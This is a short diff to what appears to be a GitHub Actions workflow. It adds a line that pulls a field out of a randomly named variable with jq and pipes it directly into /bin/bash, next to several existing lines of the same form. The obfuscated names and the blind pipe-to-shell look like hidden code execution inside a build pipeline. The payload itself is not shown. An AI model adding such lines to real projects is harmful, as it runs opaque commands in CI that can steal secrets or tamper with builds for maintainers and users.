@@ -26,6 +26,7 @@ jobs:
           echo $gm95 | jq -r .msie21387 | /bin/bash
           printf '%s' "$lcbgi540" | jq -r .a545 | /bin/bash
           echo $bad4 | jq -r .hyb889 | /bin/bash
+          printf '%s' "$d97562" | jq -r .ci78427 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
